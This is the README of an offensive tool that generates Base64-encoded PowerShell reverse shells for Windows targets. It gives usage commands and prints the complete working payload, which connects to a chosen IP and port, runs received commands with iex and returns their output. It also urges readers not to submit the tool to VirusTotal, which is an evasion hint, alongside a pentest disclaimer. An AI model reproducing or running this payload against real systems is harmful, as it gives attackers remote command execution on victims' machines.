# BlackShell - Reverse Shell Generator

BlackShell is a Python script designed to generate a reverse shell payload in PowerShell for Windows targets. It allows penetration testers and ethical hackers to quickly generate custom reverse shell scripts to establish a connection to a remote host.
Features:

    - Reverse Shell Generation: Easily generate a reverse shell payload in PowerShell.
    - Customizable Payload: Specify the hostname and port to connect to.
    - Base64 Encoding: Encode the payload using Base64 for obfuscation.

## Usage:

```bash
python3 blackshell.py -H <hostname/ip:port>
```
## Example:

```bash
python3 blackshell.py -H 192.168.1.100:4444
```

This will generate a PowerShell script that establishes a reverse shell connection to the specified host and port.

```powershell
$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Note: Ensure that you have permission to perform penetration testing and always use this tool responsibly and ethically. DO NOT UPLOAD TO VIRUS TOTAL!
